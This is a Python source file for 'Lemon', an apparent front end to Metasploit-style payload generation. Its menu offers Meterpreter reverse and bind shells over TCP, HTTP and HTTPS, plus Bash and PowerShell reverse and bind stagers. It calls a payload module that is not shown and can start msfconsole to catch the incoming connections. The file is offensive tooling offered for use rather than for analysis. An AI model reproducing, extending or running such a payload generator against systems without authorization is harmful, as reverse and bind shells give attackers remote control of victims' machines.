#### MAIN LIB ####

# -=-=-=-=-=-=-
VERSION = 'v1.0'

from colorama import init, Fore, Back, Style
import os
import sys
import requests

from lib.payload import *
init()
# -=-=-=-=-=-=-

## banner / start
def exit():
	os.system('clear')
	print(fr'''{Fore.YELLOW}
	.----------------------------.
	|                            |
	| {Fore.RESET}Thank you for using Lemon!{Fore.YELLOW} |
	|       {Fore.RESET}<3{Fore.YELLOW}                   |
	|          {Fore.RESET}-SpiceSouls{Fore.YELLOW}       |
	|                            |
	'----------------------------'

''')
	sys.exit()
def intersection(message):
	print('\n' + Style.BRIGHT + Fore.GREEN + '=' * 80 + Fore.YELLOW)
	count = 80 - len(message)
	count = count // 2
	print(' ' * count + message)
	print(Fore.GREEN + '=' * 80 + Style.RESET_ALL)
def banner(message):
	os.system('resize -s 40 80')
	os.system('clear')
	print(fr'''{Fore.GREEN}{Style.BRIGHT}
        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
        █{Fore.YELLOW}  ___       _______  ___      ___     ______    _____  ___   {Fore.GREEN}█
        █{Fore.YELLOW} |"  |     /"     "||"  \    /"  |   /    " \  (\"   \|"  \  {Fore.GREEN}█
        █{Fore.YELLOW} ||  |    (: ______) \   \  //   |  // ____  \ |.\\   \    | {Fore.GREEN}█
        █{Fore.YELLOW} |:  |     \/    |   /\\  \/.    | /  /    ) :)|: \.   \\  | {Fore.GREEN}█
        █{Fore.YELLOW}  \  |___  // ___)_ |: \.        |(: (____/ // |.  \    \. | {Fore.GREEN}█
        █{Fore.YELLOW} ( \_|:  \(:      "||.  \    /:  | \        /  |    \    \ | {Fore.GREEN}█
        █{Fore.YELLOW}  \_______)\_______)|___|\__/|___|  \"_____/    \___|\____\) {Fore.GREEN}█
        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

                         {Fore.RED}....{Fore.RESET} SpiceSouls {Fore.RED}---{Fore.RESET} v1.0.0 {Fore.RED}....
{Style.RESET_ALL}''')
	intersection(message)
	print(fr'''
	      {Style.BRIGHT}{Fore.GREEN}[{Fore.YELLOW}01{Fore.GREEN}]{Style.RESET_ALL} Meterpreter Reverse TCP
	      {Style.BRIGHT}{Fore.GREEN}[{Fore.YELLOW}02{Fore.GREEN}]{Style.RESET_ALL} Meterpreter Bind TCP
              {Style.BRIGHT}{Fore.GREEN}[{Fore.YELLOW}03{Fore.GREEN}]{Style.RESET_ALL} Meterpreter Reverse HTTP
	      {Style.BRIGHT}{Fore.GREEN}[{Fore.YELLOW}04{Fore.GREEN}]{Style.RESET_ALL} Meterpreter Reverse HTTPS

	      {Style.BRIGHT}{Fore.GREEN}[{Fore.YELLOW}05{Fore.GREEN}]{Style.RESET_ALL} Bash Stager Reverse TCP
	      {Style.BRIGHT}{Fore.GREEN}[{Fore.YELLOW}06{Fore.GREEN}]{Style.RESET_ALL} Bash Stager Reverse UDP
	      {Style.BRIGHT}{Fore.GREEN}[{Fore.YELLOW}07{Fore.GREEN}]{Style.RESET_ALL} Powershell Stager Reverse TCP
              {Style.BRIGHT}{Fore.GREEN}[{Fore.YELLOW}08{Fore.GREEN}]{Style.RESET_ALL} Powershell Stager Bind TCP

	      {Style.BRIGHT}{Fore.GREEN}[{Fore.YELLOW}99{Fore.GREEN}]{Style.RESET_ALL} Update
              {Style.BRIGHT}{Fore.GREEN}[{Fore.YELLOW}00{Fore.GREEN}]{Style.RESET_ALL} Exit
''')
def update():
	response = requests.get("https://api.github.com/repos/spicesouls/lemon/releases/latest")
	if response.json()["name"] == VERSION:
		print(f"\nLemon {Fore.GREEN}is up to date!{Fore.RESET} ({VERSION})")
		input('Press ENTER To Continue...')
	else:
		print(f"\nLemon is {Fore.RED}NOT{Fore.RESET} up to date. (Current: {VERSION}, New: {response.json()['name']})\nDownload the Updated version at: {Style.BRIGHT}{Fore.GREEN}https://github.com/spicesouls/lemon{Style.RESET_ALL}")
		input('Press ENTER To Continue...')

def commandloop():
	while True:
		banner('MAIN MENU - SELECT AN OPTION')
		try:
			selection1 = input(f'{Style.BRIGHT}[{Fore.YELLOW}Lemon{Fore.RESET}]{Style.RESET_ALL} >> ')
		except KeyboardInterrupt:
			print(f'\nExit?\n\n{Style.BRIGHT}{Fore.YELLOW}[{Fore.GREEN}Y{Fore.YELLOW}]{Fore.RESET}/{Fore.YELLOW}[{Fore.RED}N{Fore.YELLOW}]{Style.RESET_ALL}\n ')
			exitc = input('>> ').upper()
			if exitc == 'Y':
				exit()
			else:
				break
		try:
			if int(selection1) == 0:
				exit()
			elif int(selection1) == 99:
				update()
				break
			elif int(selection1) < 5:
				os.system('resize -s 30 80')
				os.system('clear')
				print(fr'''{Style.BRIGHT}{Fore.RED}
       _____    ____________________{Fore.WHITE}____   ____{Fore.RED}
      /     \  /   _____/\_   _____/{Fore.WHITE}\   \ /   /____   ____   ____   _____{Fore.RED}
     /  \ /  \ \_____  \  |    __)  {Fore.WHITE} \   Y   // __ \ /    \ /  _ \ /     \{Fore.RED}
    /    Y    \/        \ |     \   {Fore.WHITE}  \     /\  ___/|   |  (  <_> )  Y Y  \{Fore.RED}
    \____|__  /_______  / \___  /   {Fore.WHITE}   \___/  \___  >___|  /\____/|__|_|  /{Fore.RED}
            \/        \/      \/    {Fore.WHITE}              \/     \/             \/{Fore.RED}
{Style.RESET_ALL}''')
				intersection("PAYLOAD OPTIONS")
				if selection1 == '1':
					workingpayload = payloadoptions("windowsARCHmeterpreter_reverse_tcp")
				elif selection1 == '2':
					workingpayload = payloadoptions("windowsARCHmeterpreter_bind_tcp")
				elif selection1 == '3':
					workingpayload = payloadoptions("windowsARCHmeterpreter_reverse_http")
				elif selection1 == '4':
					workingpayload = payloadoptions("windowsARCHmeterpreter_reverse_https")

			elif int(selection1) > 4 and int(selection1) < 9:
                                os.system('resize -s 30 80')
                                os.system('clear')
                                print(fr'''{Style.BRIGHT}{Fore.CYAN}
	                    _ {Fore.RESET}  __ _{Fore.CYAN}
	  ___ _ __ ___   __| |{Fore.RESET} / _\ |_ __ _  __ _  ___ _ __ ___{Fore.CYAN}
	 / __| '_ ` _ \ / _` |{Fore.RESET} \ \| __/ _` |/ _` |/ _ \ '__/ __|{Fore.CYAN}
	| (__| | | | | | (_| |{Fore.RESET} _\ \ || (_| | (_| |  __/ |  \__ \{Fore.CYAN}
	 \___|_| |_| |_|\__,_|{Fore.RESET} \__/\__\__,_|\__, |\___|_|  |___/{Fore.CYAN}
	                      {Fore.RESET}              |___/{Fore.CYAN}
{Style.RESET_ALL}''')
                                intersection("PAYLOAD OPTIONS")
                                if selection1 == '5':
                                        workingpayload = payloadoptions("cmd/unix/reverse_bash")
                                elif selection1 == '6':
                                        workingpayload = payloadoptions("cmd/unix/reverse_bash_udp")
                                elif selection1 == '7':
                                        workingpayload = payloadoptions("cmd/windows/powershell_reverse_tcp")
                                elif selection1 == '8':
                                        workingpayload = payloadoptions("cmd/windows/powershell_bind_tcp")
			intersection("PAYLOAD GENERATION")
			workingpayload.generate()
			msfchoice = input(f'\nWould you like to get the MSF Console ready to handle connections? {Style.BRIGHT}[{Fore.GREEN}Y{Fore.RESET}]/[{Fore.RED}N{Fore.RESET}]{Style.RESET_ALL}\n>> ').upper()
			if msfchoice == 'Y':
				rfilepath = generateresource(workingpayload)
				os.system(f'msfconsole -r {rfilepath}')
		except KeyboardInterrupt:
			pass
		except ValueError:
			pass
